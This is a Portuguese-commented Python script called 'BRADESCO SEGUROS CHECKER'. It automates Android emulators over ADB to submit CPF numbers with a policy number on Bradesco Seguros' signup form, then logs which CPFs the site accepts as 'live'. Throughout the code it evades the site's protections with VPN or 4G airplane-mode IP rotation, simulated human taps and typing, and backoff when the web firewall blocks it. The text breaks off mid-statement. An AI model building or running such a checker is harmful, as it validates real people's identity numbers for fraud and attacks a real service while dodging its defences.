import subprocess
import time
import xml.etree.ElementTree as ET
import re
import sys
import os
import threading
import math
import random

try:
    import requests as _requests
    _REQUESTS_OK = True
except ImportError:
    _REQUESTS_OK = False

# ==========================================
# CONFIG
# ==========================================

ADB    = "adb"
MEMUC  = r"C:\Program Files\Microvirt\MEmu\memuc.exe"
BASE_URL = (
    "https://wwws.bradescovp.com.br/"
    "SVGB-PIVI/login/logintd-view.do"
)
APOLICE            = "900191"
MENSAGEM_ERRO      = "Preenchimento incorreto"
MENSAGEM_POSITIVO  = "Insira seu primeiro nome"
PASTA_RESULTADOS   = "19-BRADESCO-SEGUROS-ADB"

MAX_REFILL_PREENCHIMENTO = 5   # re-preenche o form N vezes antes de reiniciar browser

os.makedirs(PASTA_RESULTADOS, exist_ok=True)

ARQUIVO_LIVE        = os.path.join(PASTA_RESULTADOS, "live.txt")
ARQUIVO_ERRO        = os.path.join(PASTA_RESULTADOS, "erro.txt")
ARQUIVO_DESCONHECIDO= os.path.join(PASTA_RESULTADOS, "desconhecido.txt")

# Preenchidos na inicialização
MODO_IP                  = None   # "vpn" | "4g" | "normal"
LIMITE_TROCA_GLOBAL      = None
DEVICE_4G                = None   # serial do celular real responsável pelo modo avião
REINICIAR_EMULADOR_A_CADA= 0      # 0 = desativado; N = reinicia a cada N CPFs processados

# Tempos 4G
PAUSA_MODO_AVIAO   = 4
AGUARDO_RECONEXAO  = 12

# ==========================================
# CORES
# ==========================================

VERDE    = "\033[92m"
VERMELHO = "\033[91m"
AMARELO  = "\033[93m"
CIANO    = "\033[96m"
BRANCO   = "\033[97m"
CINZA    = "\033[90m"
RESET    = "\033[0m"
BOLD     = "\033[1m"

# ==========================================
# UTILITÁRIOS DE EXIBIÇÃO
# ==========================================

print_lock          = threading.Lock()
ip_lock             = threading.Lock()   # serializa rotações — só 1 thread por vez
reinicio_lock       = threading.Lock()   # serializa reinícios — só 1 emulador por vez
_ultimo_rotation_ts = 0.0                # timestamp da última rotação concluída
_COOLDOWN_ROTACAO   = 30                 # segundos mínimos entre rotações

def linha(char="─", largura=46, cor=CINZA):
    with print_lock:
        print(f"{cor}{char * largura}{RESET}")

def cabecalho():
    os.system("cls" if os.name == "nt" else "clear")
    print()
    linha("═")
    print(f"{BOLD}{BRANCO}{'BRADESCO SEGUROS CHECKER':^46}{RESET}")
    linha("═")
    print()

def log(device, msg, cor=RESET):
    with print_lock:
        hora = time.strftime("%H:%M:%S")
        tag  = f"{CINZA}[{device}][{hora}]{RESET}"
        print(f"  {tag} {cor}{msg}{RESET}")

def status(label, valor, cor=BRANCO):
    with print_lock:
        print(f"  {CINZA}{label:<18}{RESET}{cor}{valor}{RESET}")

# ==========================================
# LISTAR DEVICES
# ==========================================

def listar_devices():
    result = subprocess.run(
        f"{ADB} devices",
        shell=True,
        capture_output=True,
        text=True
    )
    devices = []
    for linha_txt in result.stdout.splitlines():
        if "\tdevice" in linha_txt:
            devices.append(linha_txt.split("\t")[0])
    return devices

# ==========================================
# DIVIDE LISTA
# ==========================================

def dividir_lista(lista, n):
    tamanho = math.ceil(len(lista) / n)
    return [lista[i:i + tamanho] for i in range(0, len(lista), tamanho)]

# ==========================================
# TROCA DE IP — 4G (modo avião)
# ==========================================

def _obter_ip_publico():
    if not _REQUESTS_OK:
        return None
    for url in [
        "https://ifconfig.me",
        "https://api.ipify.org",
        "https://ipinfo.io/ip",
    ]:
        try:
            r = _requests.get(url, timeout=5)
            if r.status_code == 200:
                return r.text.strip()
        except Exception:
            continue
    return None

def _adb_shell(cmd):
    serial = f"-s {DEVICE_4G} " if DEVICE_4G else ""
    try:
        subprocess.run(
            f"adb {serial}shell {cmd}",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=15
        )
    except Exception:
        pass

def rotacionar_4g(device="", force=False):
    """
    Serializada por ip_lock com cooldown:
    - A 1ª thread que chega executa o ciclo completo e atualiza o timestamp.
    - As demais que estavam na fila verificam o cooldown ao adquirir o lock:
      se a rotação foi há menos de _COOLDOWN_ROTACAO segundos, pulam o ciclo
      e aproveitam o IP já trocado pela primeira — evitando o efeito cascata.
    - force=True ignora o cooldown (usado em bloqueios críticos de URL).
    """
    global _ultimo_rotation_ts
    with ip_lock:
        agora = time.time()
        if not force and agora - _ultimo_rotation_ts < _COOLDOWN_ROTACAO:
            # Rotação recente feita por outra thread — aproveita e segue
            with print_lock:
                tag = f"[{device}] " if device else ""
                print(f"  {CINZA}{tag}IP já trocado recentemente — seguindo.{RESET}")
            return

        tag = f"[{device}] " if device else ""
        with print_lock:
            print(f"\n  {AMARELO}{tag}Trocando IP via 4G...{RESET}")

        ip_antigo = _obter_ip_publico()

        _adb_shell("cmd connectivity airplane-mode enable")
        time.sleep(PAUSA_MODO_AVIAO)
        _adb_shell("cmd connectivity airplane-mode disable")

        with print_lock:
            print(f"  {CINZA}{tag}Aguardando reconexão ({AGUARDO_RECONEXAO}s)...{RESET}")
        time.sleep(AGUARDO_RECONEXAO)

        ip_novo = _obter_ip_publico()
        if not ip_novo:
            time.sleep(5)
            ip_novo = _obter_ip_publico()

        _ultimo_rotation_ts = time.time()  # marca após ciclo completo

        with print_lock:
            if ip_novo and ip_novo != ip_antigo:
                print(f"  {VERDE}{tag}Novo IP: {ip_novo}{RESET}")
            elif ip_novo:
                print(f"  {AMARELO}{tag}IP mantido pela operadora: {ip_novo}{RESET}")
            else:
                print(f"  {VERMELHO}{tag}Sem conexão após troca.{RESET}")

# ==========================================
# TROCA DE IP — HMA VPN
# ==========================================

def rotacionar_vpn(device="", force=False):
    global _ultimo_rotation_ts
    servico = "HmaProVpn"
    tag = f"[{device}] " if device else ""
    with ip_lock:
        agora = time.time()
        if not force and agora - _ultimo_rotation_ts < _COOLDOWN_ROTACAO:
            with print_lock:
                print(f"  {CINZA}{tag}VPN já trocada recentemente — seguindo.{RESET}")
            return
        try:
            with print_lock:
                print(f"  {AMARELO}{tag}Trocando IP via VPN...{RESET}")
            subprocess.run(
                ["net", "stop", servico],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            time.sleep(3)
            subprocess.run(
                ["net", "start", servico],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            with print_lock:
                print(f"  {CINZA}{tag}Aguardando VPN reconectar (15s)...{RESET}")
            time.sleep(15)
            _ultimo_rotation_ts = time.time()
        except Exception as e:
            with print_lock:
                print(f"  {VERMELHO}{tag}Erro VPN: {e}{RESET}")

# ==========================================
# WORKER
# ==========================================

WATCHDOG_TIMEOUT = 300   # segundos sem atividade → reinicia emulador

class EmuladorWorker:

    def __init__(self, device_id, cpfs, indice):
        self.device      = device_id
        self.cpfs        = cpfs
        self.indice      = indice
        # Porta TCP do device → índice MEmu (ex: 127.0.0.1:21523 → porta 21523)
        # MEmu mapeia: índice 0 = porta base, índice N = porta base + N*10
        # Detectado automaticamente a partir do serial
        self._memu_index     = self._detectar_indice_memu()
        self._heartbeat      = time.time()   # atualizado a cada ação do worker
        self._watchdog_ativo = False
        self._watchdog_thread= None

    # ── WATCHDOG ──────────────────────────

    def _toque(self):
        """Atualiza o heartbeat — chame em qualquer ação que prove que o worker está vivo."""
        self._heartbeat = time.time()

    def _iniciar_watchdog(self):
        self._watchdog_ativo = True
        self._heartbeat      = time.time()

        def _loop():
            while self._watchdog_ativo:
                time.sleep(15)
                if not self._watchdog_ativo:
                    break
                inativo = time.time() - self._heartbeat
                if inativo >= WATCHDOG_TIMEOUT:
                    log(self.device,
                        f"Watchdog: sem atividade há {int(inativo)}s — reiniciando emulador...",
                        VERMELHO)
                    self._toque()          # reseta antes de reiniciar (evita loop)
                    self.reiniciar_emulador()
                    # Limpeza leve pós-reinício (sem chamar limpar_estado_inicial
                    # para não reiniciar o emulador duas vezes)
                    self.adb("shell am force-stop com.android.chrome", timeout=10)
                    self.adb("shell rm -rf /data/data/com.android.chrome/app_tabs/*", timeout=10)
                    self.adb("shell rm -rf /data/data/com.android.chrome/cache/*", timeout=10)
                    self.adb("shell input keyevent KEYCODE_HOME", timeout=10)
                    self._toque()

        self._watchdog_thread = threading.Thread(
            target=_loop,
            name=f"watchdog-{self.device}",
            daemon=True
        )
        self._watchdog_thread.start()

    def _parar_watchdog(self):
        self._watchdog_ativo = False

    # ── DETECÇÃO DE ÍNDICE MEMU ───────────

    def _detectar_indice_memu(self):
        """
        Mapeia o serial ADB (ex: 127.0.0.1:21523) para o índice MEmu.
        MEmu usa a fórmula: porta ADB = 21503 + índice * 10
        """
        if ":" not in self.device:
            return None  # device físico USB — não tem índice MEmu
        try:
            porta = int(self.device.split(":")[1])
            idx = (porta - 21503) // 10
            if idx >= 0:
                return idx
        except Exception:
            pass
        return None

    # ── REINICIAR EMULADOR ────────────────

    def reiniciar_emulador(self):
        """
        Reinicia o emulador via memuc.
        Serializado por reinicio_lock: apenas 1 emulador reinicia por vez,
        evitando sobrecarga quando múltiplas threads atingem o limite ao mesmo tempo.
        """
        if self._memu_index is None:
            log(self.device, "Reinício automático não suportado (sem índice MEmu)", AMARELO)
            return False

        with reinicio_lock:
            log(self.device, f"Reiniciando emulador (índice {self._memu_index})...", AMARELO)
            try:
                subprocess.run(
                    [MEMUC, "stop", "-i", str(self._memu_index)],
                    timeout=30, capture_output=True
                )
                time.sleep(5)
                subprocess.run(
                    [MEMUC, "start", "-i", str(self._memu_index)],
                    timeout=30, capture_output=True
                )
            except Exception as e:
                log(self.device, f"Erro ao reiniciar via memuc: {e}", VERMELHO)
                return False

            # Espera dentro do lock para que o próximo reinício só comece
            # após este emulador terminar de inicializar — evita sobrecarga simultânea.
            log(self.device, "Aguardando Android inicializar (até 120s)...", CINZA)
            inicio = time.time()
            while time.time() - inicio < 120:
                time.sleep(5)
                self._toque()   # mantém watchdog vivo durante o boot
                saida = self.adb("shell getprop sys.boot_completed", timeout=15)
                if saida.strip() == "1":
                    time.sleep(5)
                    log(self.device, "Emulador reiniciado com sucesso.", VERDE)
                    return True

            log(self.device, "Emulador não respondeu após reinício.", VERMELHO)
            return False

    # ── ADB ────────────────────────────────

    def adb(self, cmd, timeout=30):
        """
        Executa comando ADB com timeout.
        Comandos de dump de UI podem demorar mais (usa timeout=45).
        Se o processo travar, TimeoutExpired é lançado e capturado
        pelo chamador (dump_ui tem try/except, os demais ignoram silenciosamente).
        """
        try:
            result = subprocess.run(
                f"{ADB} -s {self.device} {cmd}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return result.stdout
        except subprocess.TimeoutExpired:
            return ""

    # ── TAP HUMANO (Gaussiano) ─────────────

    def _gaussiano(self, centro, desvio):
        while True:
            v = random.gauss(0, desvio)
            if abs(v) <= desvio * 2:
                return int(centro + v)

    def tap(self, cx, cy, desvio_x=6, desvio_y=5):
        x    = self._gaussiano(cx, desvio_x)
        y    = self._gaussiano(cy, desvio_y)
        hold = random.randint(65, 125)
        self.adb(
            f"shell input touchscreen swipe "
            f"{x} {y} {x} {y} {hold}"
        )
        time.sleep(random.uniform(0.08, 0.18))

    # ── DIGITAÇÃO HUMANA ───────────────────

    def digitar(self, valor):
        ESPECIAIS = set(" '\"\\()&|;<>`$!#~*?")
        # Envia tudo de uma vez quando não há caracteres especiais (CPF, apólice, etc.)
        if not any(c in ESPECIAIS for c in valor):
            self.adb(f'shell input text "{valor}"')
            time.sleep(random.uniform(0.10, 0.25))
            return
        # Fallback caractere-a-caractere para strings com especiais
        for char in valor:
            if char == " ":
                escaped = "%s"
            elif char in ESPECIAIS:
                escaped = f"\\{char}"
            else:
                escaped = char
            self.adb(f'shell input text "{escaped}"')
            delay = random.uniform(0.070, 0.210)
            if random.random() < 0.08:
                delay += random.uniform(0.25, 0.65)
            time.sleep(delay)

    # ── SWIPE ORGÂNICO (Bézier Cúbica) ────

    def _bezier_cubica(self, t, p0, p1, p2, p3):
        u = 1.0 - t
        return (
            u**3 * p0
            + 3 * u**2 * t * p1
            + 3 * u * t**2 * p2
            + t**3 * p3
        )

    def _ease_inout(self, t):
        return (1.0 - math.cos(math.pi * t)) / 2.0

    def swipe_organico(self, x1, y1, x2, y2,
                       passos=22, duracao_ms=320):
        # Um único comando ADB — o Android interpola internamente
        dur = duracao_ms + random.randint(-30, 30)
        ox  = random.randint(-10, 10)
        self.adb(
            f"shell input swipe "
            f"{x1 + ox} {y1} {x2 + ox} {y2} {dur}"
        )
        time.sleep(random.uniform(0.15, 0.35))

    def swipe_up(self):
        ox = random.randint(460, 540)
        self.swipe_organico(
            ox, 1400,
            ox + random.randint(-15, 15), 520,
            passos=random.randint(18, 26),
            duracao_ms=random.randint(280, 400)
        )

    # ── DELAY INTELIGENTE ─────────────────

    def esperar(self, base, variacao=0.4):
        jitter   = random.gauss(0, variacao * 0.35)
        duracao  = base + random.uniform(-variacao, variacao) + jitter
        time.sleep(max(0.05, duracao))

    # ── PAUSA ESTRATÉGICA PÓS-BLOQUEIO WAF ──

    def _pausa_waf(self, bloqueios_seguidos, tentativa, max_tentativas):
        """
        Calcula a pausa após bloqueio WAF com backoff progressivo.
          1º bloqueio  →  20s  (IP fresco, só aguarda estabilizar)
          2º bloqueio  →  45s  (IP novo ainda bloqueado, espera mais)
          3º+ bloqueio →  90s  (bloqueio persistente, pausa longa)
        """
        if bloqueios_seguidos == 1:
            pausa = 20
        elif bloqueios_seguidos == 2:
            pausa = 45
        else:
            pausa = 90
        log(self.device,
            f"WAF consecutivo #{bloqueios_seguidos} — aguardando {pausa}s antes de tentar "
            f"(tent. {tentativa}/{max_tentativas})...",
            AMARELO)
        return pausa

    def _aguardar_waf(self, segundos):
        """Espera com toque a cada 15s para não acionar o watchdog durante a pausa."""
        fim = time.time() + segundos
        while time.time() < fim:
            self._toque()
            time.sleep(min(15, max(0, fim - time.time())))

    # ── TROCAR IP (despacha pelo MODO) ────

    def alternar_ip(self, force=False):
        if MODO_IP == "vpn":
            rotacionar_vpn(self.device, force=force)
        elif MODO_IP == "4g":
            rotacionar_4g(self.device, force=force)
        else:
            # Modo normal: sem troca, só aguarda
            with print_lock:
                print(
                    f"  {CINZA}[{self.device}] "
                    f"IP fixo — sem troca.{RESET}"
                )

    # ── LIMPEZA INICIAL (ao iniciar/reiniciar script) ──────────────────

    def limpar_estado_inicial(self):
        """
        Reinicia o emulador completamente ao iniciar o script.
        Garante estado limpo mesmo que o run anterior tenha travado.
        """
        log(self.device, "Reiniciando emulador para estado limpo...", CINZA)
        reiniciou = self.reiniciar_emulador()

        if reiniciou:
            # Limpa Chrome logo após o boot — uiautomator já está fresco
            self.adb("shell am force-stop com.android.chrome", timeout=10)
            self.adb("shell rm -rf /data/data/com.android.chrome/app_tabs/*", timeout=10)
            self.adb("shell rm -rf /data/data/com.android.chrome/cache/*", timeout=10)
            self.adb("shell rm -rf /data/data/com.android.chrome/app_chrome/Default/Cache/*", timeout=10)
            self.adb("shell input keyevent KEYCODE_HOME", timeout=10)
            time.sleep(2)
            log(self.device, "Emulador pronto para iniciar.", VERDE)
        else:
            # Reinício falhou — tenta ao menos matar processos travados
            log(self.device, "Reinício falhou — limpando processos manualmente...", AMARELO)
            self.adb("shell pkill -f uiautomator", timeout=10)
            self.adb("shell am force-stop com.android.chrome", timeout=10)
            self.adb("shell rm -rf /data/data/com.android.chrome/app_tabs/*", timeout=10)
            self.adb("shell rm -rf /data/data/com.android.chrome/cache/*", timeout=10)
            self.adb("shell input keyevent KEYCODE_HOME", timeout=10)
            time.sleep(2)

    # ── RESET CHROME ──────────────────────

    def fechar_chrome(self):
        self.adb("shell am force-stop com.android.chrome")
        self.esperar(2.0, 0.5)
        # Limpa tabs abertas
        self.adb("shell rm -rf /data/data/com.android.chrome/app_tabs/*")
        # Limpa cache HTTP — principal causa de acúmulo de memória ao longo do tempo
        self.adb("shell rm -rf /data/data/com.android.chrome/cache/*")
        self.adb("shell rm -rf /data/data/com.android.chrome/app_chrome/Default/Cache/*")
        self.esperar(1.0, 0.3)
        self.adb("shell input keyevent KEYCODE_HOME")
        self.esperar(1.2, 0.4)

    # ── UI DUMP ───────────────────────────

    def dump_ui(self, tentativas=3):
        dump_path = f"window_dump_{self.device}.xml"
        for tentativa in range(1, tentativas + 1):
            try:
                self.adb(
                    "shell uiautomator dump /sdcard/window_dump.xml",
                    timeout=25
                )
                self.adb(
                    f"pull /sdcard/window_dump.xml {dump_path}",
                    timeout=15
                )
                if not os.path.exists(dump_path) or os.path.getsize(dump_path) < 100:
                    raise OSError("XML vazio ou ausente")
                root = ET.parse(dump_path).getroot()
                if root is not None:
                    return root
            except (ET.ParseError, FileNotFoundError, OSError,
                    subprocess.TimeoutExpired):
                pass
            time.sleep(2.0 * tentativa)

        # Todas as tentativas falharam → emulador provavelmente travado
        log(self.device, "Emulador irresponsivo — tentando reinício automático...", VERMELHO)
        reiniciou = self.reiniciar_emulador()
        if reiniciou:
            # Uma última tentativa após reinício
            try:
                self.adb("shell uiautomator dump /sdcard/window_dump.xml", timeout=25)
                self.adb(f"pull /sdcard/window_dump.xml {dump_path}", timeout=15)
                root = ET.parse(dump_path).getroot()
                if root is not None:
                    return root
            except Exception:
                pass
        raise RuntimeError("dump_ui falhou — emulador irresponsivo")

    # ── BOUNDS ────────────────────────────

    def centro_bounds(self, bounds):
        x1, y1, x2, y2 = map(int, re.findall(r"\d+", bounds))
        return (x1 + x2) // 2, (y1 + y2) // 2

    def area_bounds(self, bounds):
        x1, y1, x2, y2 = map(int, re.findall(r"\d+", bounds))
        return (x2 - x1) * (y2 - y1)

    def _desvio_por_bounds(self, bounds):
        x1, y1, x2, y2 = map(int, re.findall(r"\d+", bounds))
        dx = max(4, min(20, int((x2 - x1) * 0.15)))
        dy = max(4, min(20, int((y2 - y1) * 0.15)))
        return dx, dy

    # ── ENCONTRAR ELEMENTO ────────────────

    def encontrar_bounds(self, texto_busca, preferir_clickable=True):
        root = self.dump_ui()
        candidatos = []
        for node in root.iter("node"):
            texto   = node.attrib.get("text", "")
            content = node.attrib.get("content-desc", "")
            bounds  = node.attrib.get("bounds", "")
            if not bounds:
                continue
            if (
                texto_busca.lower() in texto.lower()
                or texto_busca.lower() in content.lower()
            ):
                candidatos.append({
                    "bounds":    bounds,
                    "clickable": node.attrib.get("clickable") == "true",
                    "area":      self.area_bounds(bounds)
                })
        if not candidatos:
            return None
        if preferir_clickable:
            click = [c for c in candidatos if c["clickable"]]
            if click:
                candidatos = click
        return min(candidatos, key=lambda x: x["area"])["bounds"]

    # ── CLICAR TEXTO ─────────────────────

    def clicar_texto(self, texto, tentativas=3, scroll=False):
        for _ in range(tentativas):
            bounds = self.encontrar_bounds(texto)
            if bounds:
                cx, cy = self.centro_bounds(bounds)
                dx, dy = self._desvio_por_bounds(bounds)
                self.tap(cx, cy, dx, dy)
                return True
            if scroll:
                self.swipe_up()
                self.esperar(2.0, 0.5)
        return False

    # ── AGUARDAR TEXTO ────────────────────

    def aguardar_texto(self, texto, timeout=20):
        inicio = time.time()
        while time.time() - inicio < timeout:
            if self.encontrar_bounds(texto):
                return True
            time.sleep(random.uniform(0.8, 1.4))
        return False

    # ── PREENCHER CAMPO ───────────────────

    def preencher_campo(self, indice, valor):
        root = self.dump_ui()
        edittexts = [
            n for n in root.iter("node")
            if (
                n.attrib.get("class") == "android.widget.EditText"
                and n.attrib.get("bounds")
            )
        ]
        if len(edittexts) <= indice:
            return False

        bounds = edittexts[indice].attrib.get("bounds")
        cx, cy = self.centro_bounds(bounds)
        dx, dy = self._desvio_por_bounds(bounds)

        self.tap(cx, cy, dx, dy)
        self.esperar(0.9, 0.3)

        # Select-all + delete: 2 comandos ADB no lugar de 25 keyevents separados
        self.adb("shell input keyevent KEYCODE_CTRL_A")
        time.sleep(0.08)
        self.adb("shell input keyevent KEYCODE_FORWARD_DEL")
        self.esperar(0.3, 0.1)
        self.digitar(valor)
        self.esperar(0.9, 0.3)
        return True

    # ── VERIFICAR BLOQUEIO DE URL ─────────

    def _url_bloqueada(self):
        """Retorna True se a tela atual for a página de rejeição do WAF."""
        try:
            tela = self.obter_textos_tela()
            return "the requested url was rejected" in tela.lower()
        except Exception:
            return False

    # ── ABRIR SITE ────────────────────────

    def abrir_site(self):
        self.adb(
            f'shell am start -a android.intent.action.VIEW -d "{BASE_URL}"'
        )
        # Aguarda até 30s — conexão 4G pode ser lenta logo após troca de IP
        achou = self.aguardar_texto("Cadastre-se", timeout=30)
        if achou:
            return True
        # Verifica se caiu na tela de bloqueio do WAF
        if self._url_bloqueada():
            return "BLOQUEADA"
        return False

    # ── ABRIR CADASTRO ────────────────────

    def abrir_cadastro(self):
        # Tenta clicar em "Cadastre-se" com scroll e 6 tentativas
        if not self.clicar_texto("Cadastre-se", tentativas=6, scroll=True):
            # Pode ter caído na tela de bloqueio antes mesmo do clique
            if self._url_bloqueada():
                return "BLOQUEADA"
            return False
        # Aguarda o formulário aparecer — timeout maior para rede lenta
        if self.aguardar_texto("Insira seu CPF", timeout=25):
            return True
        # Fallback: tenta scroll e aguarda mais
        self.swipe_up()
        if self.aguardar_texto("Insira seu CPF", timeout=15):
            return True
        # Clicou em "Cadastre-se" mas não abriu o form → verifica bloqueio
        if self._url_bloqueada():
            return "BLOQUEADA"
        return False

    # ── TEXTOS TELA ───────────────────────

    def obter_textos_tela(self):
        root = self.dump_ui()
        textos = []
        for node in root.iter("node"):
            t = node.attrib.get("text", "")
            c = node.attrib.get("content-desc", "")
            if t: textos.append(t)
            if c: textos.append(c)
        return " ".join(textos)

    # ── PROCESSAR CPF ─────────────────────

    def processar_cpf(self, cpf):
        try:
            if not self.preencher_campo(0, cpf):
                return False, "Falha CPF"

            self.esperar(1.1, 0.4)

            if not self.preencher_campo(1, APOLICE):
                return False, "Falha Apólice"

            self.esperar(1.3, 0.5)

            if not self.clicar_texto("Continuar", tentativas=5):
                return False, "Botão não encontrado"

            TIMEOUT_RESPOSTA = 25
            INTERVALO_POLL   = 2.0
            inicio = time.time()

            while time.time() - inicio < TIMEOUT_RESPOSTA:
                tela = self.obter_textos_tela()

                if MENSAGEM_POSITIVO.lower() in tela.lower():
                    return True, "Perguntas de confirmação"

                if MENSAGEM_ERRO.lower() in tela.lower():
                    return False, "Preenchimento incorreto"

                if "the requested url was rejected" in tela.lower():
                    return False, "URL_BLOQUEADA"

                time.sleep(INTERVALO_POLL + random.uniform(0, 0.8))

            return False, "MENSAGEM DESCONHECIDA"

        except Exception as e:
            return False, str(e)

    # ── LOOP PRINCIPAL ────────────────────

    def run(self):

        log(self.device, f"Iniciando — {len(self.cpfs)} CPFs", CIANO)
        self.limpar_estado_inicial()
        self._iniciar_watchdog()
        cpfs_desde_reinicio = 0
        form_aberto = False  # True = formulário já visível, próximo CPF entra direto
        _inicio_run = time.time()

        for i, cpf in enumerate(self.cpfs, start=1):
            self._toque()   # worker está vivo, processando novo CPF

            # Reinício preventivo do emulador para evitar lentidão
            if (REINICIAR_EMULADOR_A_CADA > 0
                    and cpfs_desde_reinicio > 0
                    and cpfs_desde_reinicio % REINICIAR_EMULADOR_A_CADA == 0):
                log(self.device,
                    f"Reinício preventivo após {REINICIAR_EMULADOR_A_CADA} CPFs...",
                    AMARELO)
                self._toque()
                self.reiniciar_emulador()
                self._toque()
                cpfs_desde_reinicio = 0
                form_aberto = False

            if MODO_IP != "normal" and i % LIMITE_TROCA_GLOBAL == 0:
                log(self.device, f"Limite atingido ({LIMITE_TROCA_GLOBAL}). Trocando IP...", AMARELO)
                self._toque()
                self.alternar_ip()
                self._toque()
                form_aberto = False  # página perde conexão após troca de IP

            log(self.device, f"[{i}/{len(self.cpfs)}] {cpf}", CINZA)

            MAX_TENTATIVAS      = 5
            tentativa_cpf       = 0
            bloqueios_seguidos  = 0   # conta bloqueios WAF consecutivos neste CPF
            sucesso             = False
            mensagem            = "Falha"

            while tentativa_cpf < MAX_TENTATIVAS:
                tentativa_cpf += 1

                try:
                    # Abre browser + site + formulário apenas quando necessário
                    if not form_aberto:
                        self.fechar_chrome()

                        resultado_site = self.abrir_site()
                        if resultado_site == "BLOQUEADA":
                            bloqueios_seguidos += 1
                            pausa = self._pausa_waf(bloqueios_seguidos, tentativa_cpf, MAX_TENTATIVAS)
                            self.reiniciar_emulador()
                            self.alternar_ip(force=True)
                            self._aguardar_waf(pausa)
                            form_aberto = False
                            continue
                        if not resultado_site:
                            bloqueios_seguidos = 0
                            log(self.device,
                                f"Site não carregou (tent. {tentativa_cpf}/{MAX_TENTATIVAS})",
                                VERMELHO)
                            self.alternar_ip()
                            form_aberto = False
                            continue

                        resultado_cad = self.abrir_cadastro()
                        if resultado_cad == "BLOQUEADA":
                            bloqueios_seguidos += 1
                            pausa = self._pausa_waf(bloqueios_seguidos, tentativa_cpf, MAX_TENTATIVAS)
                            self.reiniciar_emulador()
                            self.alternar_ip(force=True)
                            self._aguardar_waf(pausa)
                            form_aberto = False
                            continue
                        if not resultado_cad:
                            bloqueios_seguidos = 0
                            log(self.device,
                                f"Cadastro não abriu (tent. {tentativa_cpf}/{MAX_TENTATIVAS})",
                                VERMELHO)
                            self.alternar_ip()
                            form_aberto = False
                            continue

                        bloqueios_seguidos = 0
                        form_aberto = True

                    sucesso, mensagem = self.processar_cpf(cpf)

                    if mensagem == "Preenchimento incorreto":
                        # DEAD — mantém formulário aberto para o próximo CPF
                        bloqueios_seguidos = 0
                        form_aberto = True
                        break

                    if mensagem == "URL_BLOQUEADA":
                        bloqueios_seguidos += 1
                        pausa = self._pausa_waf(bloqueios_seguidos, tentativa_cpf, MAX_TENTATIVAS)
                        self.reiniciar_emulador()
                        self.alternar_ip(force=True)
                        self._aguardar_waf(pausa)
                        form_aberto = False
                        continue

                    # Erros de infraestrutura → fecha browser e tenta de novo
                    if not sucesso and (
                        mensagem in ["Falha CPF", "Falha Apólice", "Botão não encontrado"]
                        or "Erro ao extrair" in mensagem
                        or "dump_ui falhou" in mensagem
                    ):
                        log(self.device,
                            f"Erro infra ({mensagem}) — tent. {tentativa_cpf}/{MAX_TENTATIVAS}",
                            VERMELHO)
                        self.alternar_ip()
                        form_aberto = False
                        continue

                    # Resultado conclusivo (LIVE ou DESCONHECIDA)
                    form_aberto = False
                    break

                except RuntimeError as e:
                    log(self.device,
                        f"UI inacessível ({e}) — tent. {tentativa_cpf}/{MAX_TENTATIVAS}",
                        VERMELHO)
                    self.alternar_ip()
                    form_aberto = False

                except Exception as e:
                    log(self.device, f"Exceção inesperada: {e}", VERMELHO)
                    mensagem = str(e)
                    form_aberto = False
                    break

            else:
                # Esgotou MAX_TENTATIVAS sem resultado conclusivo
                self.esperar(2.2, 0.7)
                cpfs_desde_reinicio += 1
                continue

            # Salvar resultado conclusivo
            if sucesso:
                with open(ARQUIVO_LIVE, "a", encoding="utf-8") as f:
                    f.write(f"{cpf}\n")
                _decorrido = int(time.time() - _inicio_run)
                _hms = f"{_decorrido//3600:02d}h{(_decorrido%3600)//60:02d}m{_decorrido%60:02d}s"
                log(self.device, f"{VERDE}LIVE{RESET} {cpf} → {mensagem}  {CINZA}[+{_hms}]{RESET}", VERDE)

            else:
                if "DESCONHECIDA" in mensagem:
                    with open(ARQUIVO_DESCONHECIDO, "a", encoding="utf-8") as f:
                        f.write(f"{cpf}\n")
                    log(self.device, f"{AMARELO}????{RESET} {cpf} → {mensagem}", AMARELO)
                else:
                    log(self.device, f"{VERMELHO}DEAD{RESET} {cpf} → {mensagem}", CINZA)

            self.esperar(2.2, 0.7)
            cpfs_desde_reinicio += 1

        self._parar_watchdog()
        _total = int(time.time() - _inicio_run)
        _hms_total = f"{_total//3600:02d}h{(_total%3600)//60:02d}m{_total%60:02d}s"
        log(self.device, f"Fatia concluída! Tempo total: {BRANCO}{_hms_total}{RESET}", VERDE)

# ==========================================
# MAIN
# ==========================================

cabecalho()

# Detectar devices
devices = listar_devices()

if not devices:
    print(f"  {VERMELHO}Nenhum device conectado.{RESET}\n")
    sys.exit(1)

status("Emuladores:", f"{len(devices)} detectado(s)", VERDE)
for d in devices:
    print(f"  {CINZA}  • {d}{RESET}")

print()

# Escolha do modo de IP
print(f"  {BRANCO}Modo de troca de IP:{RESET}")
print(f"  {CINZA}  [1]{RESET} VPN  (HMA Pro VPN)")
print(f"  {CINZA}  [2]{RESET} 4G   (Modo avião via ADB)")
print(f"  {CINZA}  [3]{RESET} Normal (sem troca)")
print()

while True:
    escolha_modo = input(f"  {AMARELO}Escolha [1/2/3]: {RESET}").strip()
    if escolha_modo == "1":
        MODO_IP = "vpn"
        break
    elif escolha_modo == "2":
        MODO_IP = "4g"
        if not _REQUESTS_OK:
            print(
                f"  {AMARELO}Aviso: biblioteca 'requests' não instalada. "
                f"A verificação de IP será desativada.{RESET}"
            )
        # Selecionar qual device físico faz o modo avião
        # (evita erro "Multiple ADB devices" quando há emuladores conectados)
        print()
        print(f"  {BRANCO}Selecione o celular 4G (modo avião):{RESET}")
        todos_devices = listar_devices()
        for idx, d in enumerate(todos_devices, start=1):
            print(f"  {CINZA}  [{idx}]{RESET} {d}")
        print()
        while True:
            escolha_4g = input(
                f"  {AMARELO}Número do celular 4G: {RESET}"
            ).strip()
            if escolha_4g.isdigit() and 1 <= int(escolha_4g) <= len(todos_devices):
                DEVICE_4G = todos_devices[int(escolha_4g) - 1]
                print(
                    f"\n  {VERDE}Celular 4G definido: {DEVICE_4G}{RESET}"
                )
                break
            print(f"  {VERMELHO}Opção inválida.{RESET}")
        break
    elif escolha_modo == "3":
        MODO_IP = "normal"
        break
    else:
        print(f"  {VERMELHO}Opção inválida.{RESET}")

# Remove o celular 4G da lista de workers — ele é exclusivo para modo avião
if MODO_IP == "4g" and DEVICE_4G and DEVICE_4G in devices:
